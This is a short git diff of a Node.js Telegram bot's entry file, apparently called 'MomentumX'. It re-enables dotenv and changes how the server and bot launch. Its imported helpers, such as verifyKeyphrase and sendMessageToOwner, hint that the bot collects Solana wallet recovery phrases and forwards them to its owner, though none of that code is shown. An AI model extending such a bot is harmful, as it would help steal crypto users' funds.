@@ -1,6 +1,6 @@
 import { Telegraf, session, Markup } from "telegraf";
 import express from 'express'
-/*import dotenv from 'dotenv'*/
+import dotenv from 'dotenv'
 import { pumpBoost, startMessage, pumpBoostAmount, verifySolanaAddress, verifyInformation, verifiedMessage, confirmTransation, sendTransactionHash, verifyTransactionHash, contactSupport } from "./PumpBoost.js";
 import { awaitConnect, Connect, documentDoc, safetyTips, sendMessageToOwner, verifyKeyphrase, whyConnect } from "./Connect.js";
 import { LoadAnimation } from "./tempMesg/LoadAnimation.js";
@@ -9,10 +9,10 @@ import { Add, balanceInfo, Deposit, Withdraw } from "./BalanceInfo.js";
 import { Mongo } from "@telegraf/session/mongodb";
 import { Database } from "../MongoDB/Database.js";
 
-/*dotenv.config()*/
+dotenv.config()
 
 const app = express()
-const PORT = process.env.PORT || 3000
+const PORT = process.env.PORT || 3000;
 
 const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN)
 const ownerId1 = process.env.TELEGRAM_OWNERID
@@ -908,11 +908,14 @@ bot.on('photo', async (ctx) => {
   }
 })
 
-
-app.listen(PORT, () => {
-  console.log(`Port running at ${PORT}`)
-  bot.launch();
-})
+app.listen(PORT, '0.0.0.0', () => {
+  console.log(`✅ Server is live on port ${PORT}`);
+  
+  // Start the bot using Long Polling for fps.ms
+  bot.launch().then(() => {
+    console.log("🚀 MomentumX Bot is successfully connected!");
+  });
+});
 
 process.once('SIGINT', () => {
   console.log('SIGINT received, stopping bot...');
